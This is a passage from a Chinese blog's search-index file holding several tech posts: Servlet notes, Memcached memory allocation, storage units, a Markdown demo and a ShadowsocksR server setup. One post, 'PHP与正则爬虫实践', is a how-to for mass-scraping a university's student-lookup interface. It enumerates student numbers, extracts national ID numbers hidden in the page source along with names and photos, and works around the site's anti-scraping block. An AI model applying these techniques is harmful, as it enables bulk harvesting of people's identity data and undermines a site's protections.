title="destroy()方法："></a>destroy()方法：</h3><p>当容器检测到一个Servlet对象应该从服务中被移除的时候，容器会调用该对象的destroy()方法，以便让Servlet对象可以释放它所使用的资源，保存数据到持久存储设备中，例如将内存中的数据保存到数据库中，关闭数据库的连接等。当需要释放内存或者容器关闭时，容器就会调用Servlet对象的destroy()方法，在Servlet容器调用destroy()方法前，如果还有其他的线程正在service()方法中执行容器会等待这些线程执行完毕或者等待服务器设定的超时值到达。一旦Servlet对象的destroy()方法被调用，容器不回再把请求发送给该对象。如果需要改Servlet再次为客户端服务，容器将会重新产生一个Servlet对象来处理客户端的请求。在destroy()方法调用之后，容器会释放这个Servlet对象，在随后的时间内，该对象会被java的垃圾收集器所回收。</p><h3 id="getServletConfig-方法："><a href="#getServletConfig-方法：" class="headerlink" title="getServletConfig()方法："></a>getServletConfig()方法：</h3><p>该方法返回容器调用init()方法时传递给Servlet对象的ServletConfig对象，ServletConfig对象包含了Servlet的初始化参数。</p><h3 id="getServletInfo-方法："><a href="#getServletInfo-方法：" class="headerlink" title="getServletInfo()方法："></a>getServletInfo()方法：</h3><p>返回一个String类型的字符串，其中包括了关于Servlet的信息，例如，作者、版本和版权。该方法返回的应该是纯文本字符串，而不是任何类型的标记。</p><p>关于Servlet接口的五个方法的精彩文字转载自<a href="http://www.cnblogs.com/freeabyss/archive/2013/07/11/3187047.html">这里</a>。</p><h2 id="2-继承GenericServlet类："><a href="#2-继承GenericServlet类：" class="headerlink" title="2.继承GenericServlet类："></a>2.继承GenericServlet类：</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebServlet(&quot;/Servlet_1_2&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Servlet_1_2</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">GenericServlet</span> &#123;<br><br><span class="hljs-comment">//重写service方法即可</span><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(ServletRequest arg0, ServletResponse arg1)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br><span class="hljs-comment">// TODO 自动生成的方法存根</span><br><span class="hljs-keyword">try</span>&#123;  <br>            System.out.println(<span class="hljs-string">&quot;service....&quot;</span>);<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;  <br>            e.printStackTrace();  <br>        &#125;  <br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="注解：-1"><a href="#注解：-1" class="headerlink" title="注解："></a>注解：</h3><p>这里的实现方法也是新建一个类，手动添加<code>@WebServlet(&quot;/Servlet_1_2&quot;)</code>这一行代码，然后只重写service()方法即可，如果我们直接通过实现Servlet接口来编写一个Servlet类，就需要实现Servlet接口中定义的5种方法，为了简化Servlet的编写，在javax.servlet包中，给我们提供了一个抽象的类GenericServlet，它提供了除service()方法外的其他4种方法的简单实现。GenericServlet类定义了一个通用的，不依赖具体协议的Servlet。实践出现的一个有意思的事情是，我进入映射的虚拟路径&#x2F;Servlet_1_2后，发现控制台输出的信息如下，这里我并没有修改init()方法:</p><p><img src="/assets/images/jsp-work-1-4.jpg" alt="控制台" loading="lazy"></p><h2 id="2-继承HttpServlet类："><a href="#2-继承HttpServlet类：" class="headerlink" title="2.继承HttpServlet类："></a>2.继承HttpServlet类：</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebServlet(&quot;/Servlet_1&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Servlet_1</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(HttpServletRequest arg0, HttpServletResponse arg1)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br><span class="hljs-comment">// TODO 自动生成的方法存根</span><br><span class="hljs-comment">// super.service(arg0, arg1);</span><br>System.out.println(<span class="hljs-string">&quot;service....&quot;</span>);<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-comment">// TODO 自动生成的方法存根</span><br><span class="hljs-comment">// super.destroy();</span><br>System.out.println(<span class="hljs-string">&quot;destroy....&quot;</span>);<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br><span class="hljs-comment">// TODO 自动生成的方法存根</span><br><span class="hljs-comment">// super.init();</span><br>System.out.println(<span class="hljs-string">&quot;init.....&quot;</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="注解：-2"><a href="#注解：-2" class="headerlink" title="注解："></a>注解：</h3><p>新建一个Servlet类时的默认构建方法，也是最常用的构建方法。由于大多数网络应用中，都是浏览器通过HTTP协议去访问服务器资源，而我们编写的Servlet也主要是应用于HTTP协议的请求和响应，为了快速开发应用于HTTP协议的Servlet，在javax.servlet.http包中给我们提供了一个抽象的类HttpServlet，他继承自GenericServlet类，用于创建适合Web站点的HTTP Servlet。</p><blockquote><p><a id="5-5"></a>作业 5：<a href="#5">点此查看要求</a></p></blockquote><p>配置Serlvet的过程可分为两种，一种是Servlet3.0版本之前的配置，相对来说比较麻烦，还有一种是Servlet3.0版本之后的配置，相对来说简单很多，具体的配置方法，我在<a href="https://bugwz.com/jsp_1/">JSP笔记_1_初次使用Servlet</a>中已经详细说明过了，这里就不做具体说明了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> JSP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Memcached的内存分配机制</title>
      <link href="/2016/10/02/memcached-memory-layout/"/>
      <url>/2016/10/02/memcached-memory-layout/</url>
      
        <content type="html"><![CDATA[<h2 id="一、基本概念"><a href="#一、基本概念" class="headerlink" title="一、基本概念"></a>一、基本概念</h2><ul><li><p><code>Slab Class</code>：由相同大小的Chunk组成，不同的Slab Class中的Chunk大小不同；</p></li><li><p><code>Page</code>：分配给单个Slab的内存大小，默认为1MB，分配给Slab之后依据Slab的大小拆分为Chunk；</p></li><li><p><code>Chunk</code>：将每一个Slab按照不同大小进行拆分，得到了不同大小的Chunk（每个Slab中的Chunk大小一致），Chunk的初始大小可以指定，并且可以根据不同的业务场景通过调整增长因子（factor：默认为1.25）进行调优；</p></li></ul><p><img src="/assets/images/memcached-slab-alloction.png" alt="Slab Alloction 构造图 " loading="lazy"></p><h2 id="二、存储过程"><a href="#二、存储过程" class="headerlink" title="二、存储过程"></a>二、存储过程</h2><p>Memcached根据收到数据的大小，选择最合适数据大小的Slab Class，根据Memcached中保存的该Slab Class中空闲的Chunk列表，将将数据存储于其中。</p><h2 id="三、相关链接"><a href="#三、相关链接" class="headerlink" title="三、相关链接"></a>三、相关链接</h2><ul><li>[The Slab Allocator: An Object-Caching Kernel Memory Allocator](</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Memcached </tag>
            
            <tag> 内存分配器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GiB与GB等单位的转换问题</title>
      <link href="/2016/03/01/unit-conversion/"/>
      <url>/2016/03/01/unit-conversion/</url>
      
        <content type="html"><![CDATA[<h2 id="一、两个标准"><a href="#一、两个标准" class="headerlink" title="一、两个标准"></a>一、两个标准</h2><ul><li><p><code>十进制标准</code>：由国际单位制（<code>SI</code>）指定；</p><blockquote><p>1999年，国际电工委员会（IEC）公布了修正2：”IEC 60027-2：电工技术应用的字母符号 — 第二部分：通信和电子。”，这个标准，在1998年通过，介绍了词头”kibi-<br>“、”mebi-“、”gibi-“、”tebi-“、”pebi-“、”exbi-“，作为二进制乘幂的计数方法。</p></blockquote></li><li><p><code>二进制标准</code>：由国际电工委员会（<code>IEC</code>）指定；</p></li></ul><p><strong>十进制标准单位换算</strong>（其中<code>KB</code>是<code>kilobyte</code>的缩写，指的是<code>千字节</code>）</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">1KB = 1000Byte<br>1MB = 1000KB<br>1GB = 1000MB<br>1TB = 1000GB<br></code></pre></td></tr></table></figure><p><strong>二进制标准单位换算</strong>（其中<code>KiB</code>是<code>kilo binary byte</code>的缩写，指的是<code>千位二进制字节</code>）</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">1KiB = 1024Byte<br>1MiB = 1024KiB<br>1GiB = 1024MiB<br>1TiB = 1024GiB<br></code></pre></td></tr></table></figure><h2 id="二、磁盘容量问题"><a href="#二、磁盘容量问题" class="headerlink" title="二、磁盘容量问题"></a>二、磁盘容量问题</h2><ul><li>硬盘制造商使用<code>十进制标准</code>；</li><li>电脑软件使用<code>二进制标准</code>；</li></ul><h2 id="三、大B与小b"><a href="#三、大B与小b" class="headerlink" title="三、大B与小b"></a>三、大B与小b</h2><p>因为在网络传输的时候，我们传输的实际上是一个个二进制数，可以俗称为<code>比特流</code>，传输二进制数的时候不需要管这是什么字，使用的什么编码，我只管自己传输了多少二进制位，因此在网络中，我们普遍使用小b作为网络传输单位。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Hardware </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Markdown语法大全</title>
      <link href="/2016/02/28/markdown/"/>
      <url>/2016/02/28/markdown/</url>
      
        <content type="html"><![CDATA[<h2 id="一、欢迎使用Markdown"><a href="#一、欢迎使用Markdown" class="headerlink" title="一、欢迎使用Markdown"></a>一、欢迎使用Markdown</h2><p>@(示例笔记本)[Markdown|帮助|Markdown]</p><ul><li><strong>功能丰富</strong> ：支持高亮代码块、<em>LaTeX</em> 公式、流程图，本地图片以及附件上传，甚至截图粘贴，工作学习好帮手；</li><li><strong>得心应手</strong> ：简洁高效的编辑器，提供[桌面客户端][1]以及[离线Chrome App][2]，支持移动端 Web；</li><li><strong>深度整合</strong> ：支持选择笔记本和添加标签，支持从印象笔记跳转编辑，轻松管理。</li></ul><h2 id="二、Markdown简介"><a href="#二、Markdown简介" class="headerlink" title="二、Markdown简介"></a>二、Markdown简介</h2><blockquote><p>Markdown 是一种轻量级标记语言，它允许人们使用易读易写的纯文本格式编写文档，然后转换成格式丰富的HTML页面。    —— <a href="https://zh.wikipedia.org/wiki/Markdown">维基百科</a></p></blockquote><p>正如您在阅读的这份文档，它使用简单的符号标识不同的标题，将某些文字标记为<strong>粗体</strong>或者<em>斜体</em>，创建一个<a href="http://www.example.com/">链接</a>或一个脚注[^demo]。下面列举了几个高级功能，更多语法请按<code>Ctrl + /</code>查看帮助。 </p><h3 id="2-1、代码块"><a href="#2-1、代码块" class="headerlink" title="2.1、代码块"></a>2.1、代码块</h3><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@requires_authorization</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">somefunc</span>(<span class="hljs-params">param1=<span class="hljs-string">&#x27;&#x27;</span>, param2=<span class="hljs-number">0</span></span>):<br>    <span class="hljs-string">&#x27;&#x27;&#x27;A docstring&#x27;&#x27;&#x27;</span><br>    <span class="hljs-keyword">if</span> param1 &gt; param2: <span class="hljs-comment"># interesting</span><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Greater&#x27;</span><br>    <span class="hljs-keyword">return</span> (param2 - param1 + <span class="hljs-number">1</span>) <span class="hljs-keyword">or</span> <span class="hljs-literal">None</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SomeClass</span>:<br>    <span class="hljs-keyword">pass</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>message = <span class="hljs-string">&#x27;&#x27;&#x27;interpreter</span><br><span class="hljs-string"><span class="hljs-meta">... </span>prompt&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="2-2、LaTeX-公式"><a href="#2-2、LaTeX-公式" class="headerlink" title="2.2、LaTeX 公式"></a>2.2、LaTeX 公式</h3><p>可以创建行内公式，例如 $\Gamma(n) &#x3D; (n-1)!\quad\forall n\in\mathbb N$。或者块级公式：</p><p>$$x &#x3D; \dfrac{-b \pm \sqrt{b^2 - 4ac}}{2a} $$</p><h3 id="2-3、表格"><a href="#2-3、表格" class="headerlink" title="2.3、表格"></a>2.3、表格</h3><table><thead><tr><th align="left">Item</th><th align="right">Value</th><th align="center">Qty</th></tr></thead><tbody><tr><td align="left">Computer</td><td align="right">1600 USD</td><td align="center">5</td></tr><tr><td align="left">Phone</td><td align="right">12 USD</td><td align="center">12</td></tr><tr><td align="left">Pipe</td><td align="right">1 USD</td><td align="center">234</td></tr></tbody></table><h3 id="2-4、流程图"><a href="#2-4、流程图" class="headerlink" title="2.4、流程图"></a>2.4、流程图</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs flow">st=&gt;start: Start<br>e=&gt;end<br>op=&gt;operation: My Operation<br>cond=&gt;condition: Yes or No?<br><br>st-&gt;op-&gt;cond<br>cond(yes)-&gt;e<br>cond(no)-&gt;op<br></code></pre></td></tr></table></figure><p>以及时序图:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs sequence">Alice-&gt;Bob: Hello Bob, how are you?<br>Note right of Bob: Bob thinks<br>Bob--&gt;Alice: I am good thanks!<br></code></pre></td></tr></table></figure><blockquote><p><strong>提示：<strong>想了解更多，请查看</strong>流程图</strong>[语法][3]以及<strong>时序图</strong>[语法][4]。</p></blockquote><h3 id="2-5、复选框"><a href="#2-5、复选框" class="headerlink" title="2.5、复选框"></a>2.5、复选框</h3><p>使用 <code>- [ ]</code> 和 <code>- [x]</code> 语法可以创建复选框，实现 todo-list 等功能。例如：</p><ul><li><input checked="" disabled="" type="checkbox"> 已完成事项</li><li><input disabled="" type="checkbox"> 待办事项1</li><li><input disabled="" type="checkbox"> 待办事项2</li></ul><blockquote><p>**注意：**目前支持尚不完全，在印象笔记中勾选复选框是无效、不能同步的，修改 Markdown 原文才可生效。</p></blockquote><h2 id="三、印象笔记相关"><a href="#三、印象笔记相关" class="headerlink" title="三、印象笔记相关"></a>三、印象笔记相关</h2><h3 id="3-1、笔记本和标签"><a href="#3-1、笔记本和标签" class="headerlink" title="3.1、笔记本和标签"></a>3.1、笔记本和标签</h3><p><strong>增加</strong>了<code>@(笔记本)[标签A|标签B]</code>语法, 以选择笔记本和添加标签。 <strong>绑定账号后</strong>， 输入<code>(</code>自动会出现笔记本列表，请从中选择。</p><h3 id="3-2、笔记标题"><a href="#3-2、笔记标题" class="headerlink" title="3.2、笔记标题"></a>3.2、笔记标题</h3><p>会自动使用文档内出现的<strong>第一个标题</strong>作为笔记标题。例如本文，就是第一行的 <code>欢迎使用</code>。</p><h3 id="3-3、快捷编辑"><a href="#3-3、快捷编辑" class="headerlink" title="3.3、快捷编辑"></a>3.3、快捷编辑</h3><p>保存在印象笔记中的笔记，右上角会有一个红色的编辑按钮，点击后会回到中打开并编辑该笔记。</p><blockquote><p>**注意：**目前用户在印象笔记中单方面做的任何修改。</p></blockquote><h3 id="3-4、数据同步"><a href="#3-4、数据同步" class="headerlink" title="3.4、数据同步"></a>3.4、数据同步</h3><p>通过<strong>将Markdown原文以隐藏内容保存在笔记中</strong>的精妙设计，实现了对Markdown的存储和再次编辑。既解决了其他产品只是单向导出HTML的单薄，又规避了服务端存储Markdown带来的隐私安全问题。这样，服务端仅作为对印象笔记 API调用和数据转换之用。</p><blockquote><p>**隐私声明：用户所有的笔记数据，均保存在印象笔记中。</p></blockquote><h3 id="3-5、离线存储"><a href="#3-5、离线存储" class="headerlink" title="3.5、离线存储"></a>3.5、离线存储</h3><p>使用浏览器离线存储将内容实时保存在本地，不必担心网络断掉或浏览器崩溃。为了节省空间和避免冲突，已同步至印象笔记并且不再修改的笔记将删除部分本地缓存，不过依然可以随时通过<code>文档管理</code>打开。</p><blockquote><p>**注意：**虽然浏览器存储大部分时候都比较可靠，但印象笔记作为专业云存储，更值得信赖。以防万一，<strong>请务必经常及时同步到印象笔记</strong>。</p></blockquote><h2 id="四、编辑器相关"><a href="#四、编辑器相关" class="headerlink" title="四、编辑器相关"></a>四、编辑器相关</h2><h3 id="4-1、设置"><a href="#4-1、设置" class="headerlink" title="4.1、设置"></a>4.1、设置</h3><p>右侧系统菜单（快捷键<code>Ctrl + M</code>）的<code>设置</code>中，提供了界面字体、字号、自定义CSS、vim&#x2F;emacs 键盘模式等高级选项。</p><h3 id="4-1、快捷键"><a href="#4-1、快捷键" class="headerlink" title="4.1、快捷键"></a>4.1、快捷键</h3><p>帮助    <code>Ctrl + /</code><br>同步文档    <code>Ctrl + S</code><br>创建文档    <code>Ctrl + Alt + N</code><br>最大化编辑器    <code>Ctrl + Enter</code><br>预览文档 <code>Ctrl + Alt + Enter</code><br>文档管理    <code>Ctrl + O</code><br>系统菜单    <code>Ctrl + M</code> </p><p>加粗    <code>Ctrl + B</code><br>插入图片    <code>Ctrl + G</code><br>插入链接    <code>Ctrl + L</code><br>提升标题    <code>Ctrl + H</code></p><p>本文转载自<a href="https://maxiang.io/">https://maxiang.io/</a>.</p>]]></content>
      
      
      
        <tags>
            
            <tag> Markdown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于SS-Panel V2的SS面板式管理系统</title>
      <link href="/2016/02/01/ss-panel-v2/"/>
      <url>/2016/02/01/ss-panel-v2/</url>
      
        <content type="html"><![CDATA[<h2 id="一、说明"><a href="#一、说明" class="headerlink" title="一、说明"></a>一、说明</h2><p>本人之前接触过Shadowsocks这个软件，感觉其实是挺好用的，因为这款软件最初的着力点是便捷的连接，通信的速度，所以使用起来的感受相比之前使用的VPN还是好了太多太多。如果是针对于像我一样有些固执的人来说，我是绝对会为了个人的方便以及使用的稳定性而购置一台服务器并进行搭建Shadowsocks服务器的，但是针对于那些Shadowsocks服务商来说，租赁出去的服务器的限制条件无非是使用时间以及使用流量。因此，针对于限制流量这一方面的话，Shadowsocks自身就无法做到了，这也是本文的初衷，可视化的界面管理工具的出现以及流量监控等功能的出现也会减少维护的繁琐程度，OK，进入正文。</p><p>注：这里所说的前端与后端是指用户看到的部分以及用户看不到的部分，看到的部分就是SS-Panel V2的界面(即前端)，看不到的部分就是运行在后面的Shadowsocks等部分(即后端)。</p><h2 id="二、正文"><a href="#二、正文" class="headerlink" title="二、正文"></a>二、正文</h2><blockquote><h2 id="1-ShadowsocksR多用户版服务端安装教程-后端"><a href="#1-ShadowsocksR多用户版服务端安装教程-后端" class="headerlink" title="1. ShadowsocksR多用户版服务端安装教程(后端)"></a>1. ShadowsocksR多用户版服务端安装教程(后端)</h2></blockquote><h3 id="2-1、-安装基本库："><a href="#2-1、-安装基本库：" class="headerlink" title="2.1、 安装基本库："></a>2.1、 安装基本库：</h3><ol><li><p>CentOS系统:</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">yum install python-setuptools<br>easy_install pip<br>yum install git<br></code></pre></td></tr></table></figure></li><li><p>Ubuntu&#x2F;Debian系统(推荐)：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">apt-get update<br>apt-get install python-pip git -y<br></code></pre></td></tr></table></figure></li></ol><p>注：如果要使用 salsa20 和 chacha20 算法，请安装 <a href="https://github.com/jedisct1/libsodium">libsodium</a>，最新版本请点击<a href="https://github.com/jedisct1/libsodium/releases">这里</a>。</p><h3 id="2-2、安装cymysql"><a href="#2-2、安装cymysql" class="headerlink" title="2.2、安装cymysql"></a>2.2、安装cymysql</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">pip install cymysql<br></code></pre></td></tr></table></figure><h3 id="2-3、获取ShadowsocksR源代码"><a href="#2-3、获取ShadowsocksR源代码" class="headerlink" title="2.3、获取ShadowsocksR源代码"></a>2.3、获取ShadowsocksR源代码</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> -b manyuser https://github.com/breakwa11/shadowsocks.git<br></code></pre></td></tr></table></figure><p>执行完毕后此目录会新建一个shadowsocks目录，其中根目录(当前目录)的是多用户版（用户数据存放在数据库中），子目录(当前目录下的shadowsocks目录)中的是单用户版(用户数据存放在文件中)。</p><h3 id="2-4、服务端配置"><a href="#2-4、服务端配置" class="headerlink" title="2.4、服务端配置"></a>2.4、服务端配置</h3><p>在多用户版的根目录中，复制<code>mysql.json</code>文件为<code>usermysql.json</code>，然后修改<code>usermysql.json</code>并找到对应的信息栏目(一定要记住!!!)：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> mysql.json usermysql.json<br>vi usermysql.json<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-string">&quot;host&quot;</span>: <span class="hljs-string">&quot;127.0.0.1&quot;</span>, //前端mysql域名/IP<br><span class="hljs-string">&quot;port&quot;</span>: 3306, //mysql端口<br><span class="hljs-string">&quot;user&quot;</span>: <span class="hljs-string">&quot;ss&quot;</span>, //mysql用户名<br><span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;pass&quot;</span>, //mysql密码<br><span class="hljs-string">&quot;db&quot;</span>: <span class="hljs-string">&quot;shadowsocks&quot;</span>, //数据库名<br></code></pre></td></tr></table></figure><h3 id="2-5、配置文件config-json"><a href="#2-5、配置文件config-json" class="headerlink" title="2.5、配置文件config.json"></a>2.5、配置文件config.json</h3><p>在多用户版的根目录将文件config.json复制一份到user-config.json，然后编辑：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> config.json user-config.json<br>vi user-config.json<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-string">&quot;method&quot;</span>:<span class="hljs-string">&quot;aes-256-cfb&quot;</span>, //修改成您要的加密方式的名称<br><span class="hljs-string">&quot;protocol&quot;</span>: <span class="hljs-string">&quot;auth_sha1_compatible&quot;</span>, //修改成您要的协议插件名称<br><span class="hljs-string">&quot;obfs&quot;</span>: <span class="hljs-string">&quot;tls1.0_session_auth_compatible&quot;</span>, //修改成您要的混淆插件名称<br></code></pre></td></tr></table></figure><blockquote><p>本文的主要内容来源于<a href="https://www.dou-bi.co/ss-jc30/">逗比根据地</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Shadowsocks </tag>
            
            <tag> SS-Panel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP与正则爬虫实践</title>
      <link href="/2016/01/26/php-regular/"/>
      <url>/2016/01/26/php-regular/</url>
      
        <content type="html"><![CDATA[<h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>之前听说过我们学校有一个学生信息的接口，最近这几天闲来无事，打算用PHP做一个爬虫，爬一下数据。由于我对数据的情有独钟，因此，弄完后打算写个文章记录下我的过程，也算是温习一下（这其中有个小插曲：本来我都写完了，可是因手贱原因，重新安装系统了，又手贱把D盘的一些软件全删了，重新安了一遍，结果把写好的爬虫文件删除了。。。。。。尝试用Recuva软件恢复，可是还是没恢复成功，没办法了，周六中午10点又写了一遍，两个小时吧，才弄好。。。真是累呀~~~~~）。推荐几个关于正则表达式的链接：<a href="http://tool.lu/regex/" target="_blank"></i>正则表达式在线工具</a> —-<a href="http://www.jb51.net/shouce/jquery1.82/regexp.html" target="_blank">正则表达式速查表</a>—-<a href="http://www.yiifcms.com/soft/9/" target="_blank">下载正则表达式CHM</a></p><h2 id="二、正文"><a href="#二、正文" class="headerlink" title="二、正文"></a>二、正文</h2><p>这里只用PHP写了爬虫，毕竟其他的我也不会。考虑到需要使用正则，因此我又去温习了一遍正则，网上有很多正则学习的地方，这里就不举例了。因为我是爬的校园内的接口，因此我会隐去网址的一部分。</p><p>首先需要获取目标网址，下面 <code>$url</code> 为目标地址，<code>$num</code> 为学号，这个接口是使用学号查询的，因此把学号弄成变量。</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$html</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span>.<span class="hljs-variable">$num</span>);<br><span class="hljs-variable">$html</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;/r&quot;</span>,<span class="hljs-string">&quot;/n&quot;</span>,<span class="hljs-string">&quot;/t&quot;</span>,<span class="hljs-string">&quot;/s&quot;</span>), <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$html</span>);<br></code></pre></td></tr></table></figure><p>为了获取该网页中的数据信息，必须对存储着网页代码的$html文件进行正则查询，因此：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&#x27;/&lt;div[^&gt;]*&gt;(.*?)&lt;\/div&gt;/si&#x27;</span>,<span class="hljs-variable">$html</span>,<span class="hljs-variable">$match</span>);<br></code></pre></td></tr></table></figure><p>然后我们通过 <code>print_r($match);</code> 会发现，<code>$match</code> 为一个二维数组，其中一个数组中存储着匹配的所有数据，包括学生姓名，性别，学号，学院，校园邮箱，其实还有一个隐藏的信息，那就是身份证号，通过查看网页源代码可以发现，但是 <code>$match</code> 数组中并没有这个数据，为止，我们可以使用下面的代码正则匹配身份证号码，其中$html为保存的网页源码变量，将匹配的身份证号码存入 <code>$idcard</code> ，但是如果想要输出身份证号码的话，要echo $idcard[0];</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\d&#123;18&#125;|\d&#123;17&#125;[0-9Xx]/&#x27;</span>,<span class="hljs-variable">$html</span>,<span class="hljs-variable">$idcard</span>);<br></code></pre></td></tr></table></figure><p>还有，注意看的话，<code>$match</code> 数组中还没有学生图片的 <code>src</code> 地址，为此我们需要分析网页源码，发现只有一个 <code>img</code> 标签，那就好办了，直接利用下面的正则代码，获取 <code>src</code> ,使用 <code>echo $link[1];</code> 输出图片链接地址，</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&lt;[img|IMG].*?src=[\&#x27;|\&quot;](.*?(?:[\.gif|\.jpg]))[\&#x27;|\&quot;].*?[\/]?&gt;/&#x27;</span>,<span class="hljs-variable">$html</span>,<span class="hljs-variable">$link</span>);<br></code></pre></td></tr></table></figure><p>这里输出的图片地址为相对地址，为了正常访问需要在前面加上前缀，具体前缀，可以在网页源码中点击图片链接后查看。</p><p>这样，图片地址，学号，姓名，学院，年级，身份证号都可以打印出来了，为了方便建议新建数组，存放这些信息。</p><h2 id="三、一些问题"><a href="#三、一些问题" class="headerlink" title="三、一些问题"></a>三、一些问题</h2><p>我在爬的过程中遇到很多小问题，下面具体说一说：</p><ul><li><p>要看清 <code>$match</code> 数组中哪些是自己需要的信息，不要弄错了。</p></li><li><p>这里是查询一个人的信息，如果多人可以弄个 <code>while(1)</code> 的循环。</p></li><li><p>查询完毕后可以把数据存入数据库或者本地文件，不过建议本地文件，毕竟这样会效率快一些。为了方便导入数据库，在存入文件时需要做一些必要的格式化处理，比如，学生的各个信息之间使用 <code>Tab</code> 分割，一个学生数据存入后，录入文件中一个回车符，这样也可以方便导入数据库。</p></li><li><p>因为学号的命名规则，前四位代表入学年份，接着两位代表学院编码，接着两位为专业编码，接着三位为专业内自己的编号，如果要是之间不作处理从最开始到最后的话，会浪费很多无用的时间，并且专业内人员的人数大多数都不会超过 <code>500</code> 人，这样每一千里面就会浪费 <code>500</code> 数据的查询时间，建议：先爬一下学院与专业的这四位数组成的学号末尾为 <code>001</code> 的数据，本地记录下，这样在进行爬虫时会节省不少时间，并且如果查询时连续出现 <code>50</code> 个空白数据，然后跳转到下一个专业或者学院代码继续爬，节省时间，等等其他方法。</p></li><li><p>注意有的学生的查询页中没有隐藏的身份证信息，这样就需要自己加个判断条件，防止写入文件时格式乱了，不利于录入数据库。</p></li><li><p>该接口使用了安全狗的检测功能，如果频繁查询，系统会屏蔽一段时间，不过这也就是 <code>10</code> 分钟左右的事，这也是需要考虑的，要知道，屏蔽后也会出现界面，这样程序在这个页面捕捉的信息也会写入文件，需要加个判断，比如，个人信息查询界面存在邮箱格式，而安全狗提示界面没有邮箱信息，可以用正则验证是否有邮箱信息，如果有的话，那就 <code>10</code> 分钟之后再试，并且不将获得的数据写入文件。</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
            <tag> 正则匹配 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shadowsocks一键安装脚本</title>
      <link href="/2016/01/23/shadowsocks-script/"/>
      <url>/2016/01/23/shadowsocks-script/</url>
      
